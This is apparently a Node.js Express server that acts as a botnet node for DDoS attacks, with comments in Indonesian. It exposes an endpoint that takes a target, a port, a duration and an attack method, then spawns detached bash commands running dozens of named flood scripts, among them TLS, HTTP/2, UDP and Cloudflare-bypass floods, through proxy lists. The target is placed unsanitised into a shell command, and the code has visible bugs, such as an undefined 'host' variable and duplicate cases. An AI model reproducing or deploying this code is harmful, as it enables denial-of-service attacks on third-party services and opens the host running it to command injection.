const express = require('express');
const { spawn } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 2216;

async function fetchData() {
    try {
        const response = await fetch('https://httpbin.org/get');
        const data = await response.json();
        console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
        return data;
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

function generateCommand(target, port, time, methods) {
    switch (methods) {
        case 'pidoras':
            return `cd /root/api/ && node pidoras.js ${host} ${time} 100 10 proxy.txt`;
        case 'tlsv2':
            return `cd /root/api/ && node tlsv2.js ${host} ${time} 100 10 proxy.txt`;
        case 'tls':
            return `cd /root/api/ && node tls.js ${host} ${time} 100 10 proxy.txt`;
        case 'glory':
            return `cd /root/api/ && node glory.js ${host} ${time} 100 10 proxy.txt`;
        case 'h2flood':
            return `cd /root/api/ && node h2flood.js ${host} ${time} 100 10 proxy.txt`;
        case 'rapex':
            return `cd /root/api/ && node rapex.js ${host} ${time} 100 10 proxy.txt`;
        case 'stars':
            return `cd /root/api/ && node stars.js ${host} ${time} 100 10 proxy.txt`;
        case 'cipca':
            return `cd /root/api/ && node cipca.js ${host} ${time} 100 10 proxy.txt`;
        case 'h2low':
            return `cd /root/api/ && node h2low.js ${host} ${time} 100 10 proxy.txt`;
        case 'tlsvipx':
            return `cd /root/api/ && node tlsvipx.js ${host} ${time} 100 10 proxy.txt`;
        case 'bp':
            return `cd /root/api/ && node bp.js ${host} ${time} 100 10 proxy.txt`;
        case 'ninja':
            return `cd /root/api/ && node ninja.js ${host} ${time} 100 10 proxy.txt`;
        case 'h2mix':
            return `cd /root/api/ && node h2mix.js ${host} ${time} 100 10 proxy.txt`;
        case 'h2flay':
            return `cd /root/api/ && node h2flay.js ${host} ${time} 100 10 proxy.txt`;
        case 'vsz':
            return `cd /root/api/ && node vsz.js ${host} ${time} 100 10 proxy.txt`;
        case 'blast':
            return `cd /root/api/ && node blast.js ${host} ${time} 100 10 proxy.txt`;
        case 'dbr':
            return `cd /root/api/ && node dbr.js ${host} ${time} 100 10 proxy.txt`;
        case 'rinegan':
            return `cd /root/api/ && node rinegan.js ${host} ${time} 100 10 proxy.txt`;
        case 'j2prime':
            return `cd /root/api/ && node j2prime.js ${host} ${time} 100 10 proxy.txt`;
        case 'quantum':
            return `cd /root/api/ && node quantum.js ${host} ${time} 100 10 proxy.txt`;
        case 'geyz':
            return `cd /root/api/ && node geyz.js ${host} ${time} 100 10 proxy.txt`;
        case 'x':
            return `cd /root/api/ && node x.js ${host} ${time} 100 10 proxy.txt`;
        case 'vsx':
            return `cd /root/api/ && node vsx.js ${host} ${time} 100 10 proxy.txt`;
        case 'xl':
            return `cd /root/api/ && node xl.js ${host} ${time} 100 10 proxy.txt`;
        case 'terano':
            return `cd /root/api/ && node terano.js ${host} ${time} 100 10 proxy.txt`;
        case 'tls7':
            return `cd /root/api/ && node tls7.js ${host} ${time} 100 10 proxy.txt`;
        case 'ths':
            return `cd /root/api/ && node ths.js ${host} ${time} 100 10 proxy.txt`;
        case 'rapidv2':
            return `cd /root/api/ && node rapidv2.js ${host} ${time} 100 10 proxy.txt`;
        case 'mix':
            return `cd /root/api/ && node mix.js ${host} ${time} 100 10 proxy.txt`;
        case 'h2':
            return `cd /root/api/ && node h2.js ${host} ${time} 100 10 proxy.txt`;
        case 'fire':
            return `cd /root/api/ && node fire.js ${host} ${time} 100 10 proxy.txt`;
        case 'kikaz':
            return `cd /root/api/ && node kikaz.js ${host} ${time} 10 100 proxy.txt`;
        case 'h2tls':
            return `cd /root/api/ && node h2tls.js ${host} ${time} 100 10 proxy.txt`;
        case 'yxz':
            return `cd /root/api/ && node yxz.js ${host} ${time} 100 10 proxy.txt`;
        case 'rapid':
            return `cd /root/api/ && node rapid.js ${host} ${time} 10 100 proxy.txt`;
        case 'xin':
            return `cd /root/api/ && node xin.js ${host} ${time} 100 10 proxy.txt`;
        case 'fny':
            return `cd /root/api/ && node fny.js ${host} ${time} 100 10 proxy.txt`;
        case 'xin':
            return `cd /root/api/ && node xin.js ${host} ${time} 10 100 proxy.txt`;
        case 'browser':
            return `cd /root/api/ && node browser.js ${host} ${time} 100 10 proxy.txt`;
        case 'retsu':
            return `cd /root/api/ && node retsu.js ${host} ${time} 100 10 proxy.txt`;
        case 'storm':
            return `cd /root/api/ && node storm.js ${host} ${time} 100 10 proxy.txt`;
        case 'xyn':
            return `cd /root/api/ && node xyn.js ${host} ${time} 100 10 proxy.txt`;
        case 'cfa':
            return `cd /root/api/ && node cfa.js ${host} ${time} 100 10 proxy.txt`;
        case 'chap':
            return `cd /root/api/ && node chap.js ${host} ${time} 100 10 proxy.txt`;
        case 'cyn':
            return `cd /root/api/ && node cyn.js ${host} ${time} 100 10 proxy.txt`;
        case 'ciko':
            return `cd /root/api/ && node ciko.js ${host} ${time} 100 10 proxy.txt`;
        case 'httpsvip':
            return `cd /root/api/ && node httpsvip.js ${host} ${time} 100 10 proxy.txt`;
        case 'zx':
            return `cd /root/api/ && node zx.js ${host} ${time} 100 10 proxy.txt`;
        case 'tlsvip':
            return `cd /root/api/ && node tlsvip.js ${host} ${time} 100 10 proxy.txt`;
        case 'geco':
            return `cd /root/api/ && node geco.js ${host} ${time} 100 10 proxy.txt`;
        case 'httpx':
            return `cd /root/api/ && node httpx.js ${host} ${time} 100 10 proxy.txt`;
        case 'flash':
            return `cd /root/api/ && node flash.js ${host} ${time} 100 10 proxy.txt`;
        case 'dreco':
            return `cd /root/api/ && node dreco.js ${host} ${time} 100 10 proxy.txt`;
        case 'bypass':
            return `cd /root/api/ && node bypass.js ${host} ${time} 10 100 proxy.txt`;
        case 'uam':
            return `cd /root/api/ && node uam.js ${host} ${time} 10 100 proxy.txt`;
        case 'bypassq':
            return `cd /root/api/ && node bypassq.js ${host} ${time} 10 100 proxy.txt`;
        case 'https':
            return `cd /root/api/ && node https.js ${host} ${time} 100 10 proxy.txt`;
        case 'tzy':
            return `cd /root/api/ && node tzy.js ${host} ${time} 100 10 proxy.txt`;
        case 'cibi':
            return `cd /root/api/ && node cibi.js ${host} ${time} 100 10 proxy.txt`;
        case 'tlsvip':
            return `cd /root/api/ && node tlsvip.js ${host} ${time} 100 10 proxy.txt`;
        case 'cf':
            return `cd /root/api/ && node cf.js ${host} ${port} ${time} 100 10 proxy.txt`;
        case 'flood':
            return `cd /root/api/ && node flood.js ${host} ${time} 100 10 proxy.txt`;
        case 'raw':
            return `cd /root/api/ && node raw.js ${host} ${time}`;
        case 'tcp':
            return `cd /root/api/ && node tcp.js ${host} ${port} ${time}`;   
        case 'ping':
            return `cd /root/api/ && node ping.js ${host} ${port} ${time}`;
        case 'udpbibas':
            return `cd /root/api/ && node udpbipas.js ${host} ${port} ${time}`;
        case 'udp':
            return `cd /root/api/ && node udp.js ${host} ${port} ${time}`;
        case 'proxy':
            return `node ./lib/cache/proxy.js`;
        case 'proxy':
            return `node ./lib/cache/proxies.js`;
        default:
            return null;
    }
}

app.get('/putraganteng', (req, res) => {
    // Parse URL untuk mengambil parameter query
    const queryObject = url.parse(req.url, true).query;
    const { target, port, time, methods } = queryObject;

    // Memberikan respon ke client
    res.status(200).json({
        status: 'Serangan PUTZXY90 Di Mulai.... ',
        target,
        port,
        time,
        methods
    });

    // Membuat command berdasarkan parameter yang diterima
    const command = generateCommand(target, port, time, methods);

    if (command) {
        // Menggunakan spawn untuk menjalankan perintah
        const process = spawn('bash', ['-c', command], { detached: true });

        // Mendengarkan aliran stdout dan stderr
        process.stdout.on('data', (data) => {
            console.log(`Stdout: ${data}`);
        });

        process.stderr.on('data', (data) => {
            console.error(`Stderr: ${data}`);
        });

        process.on('close', (code) => {
            console.log(`Proses keluar dengan kode ${code}`);
        });
    } else {
        console.log('Metode tidak valid diberikan.');
    }
});

// Menunggu request pada port yang ditentukan
app.listen(port, () => {
    fetchData();
});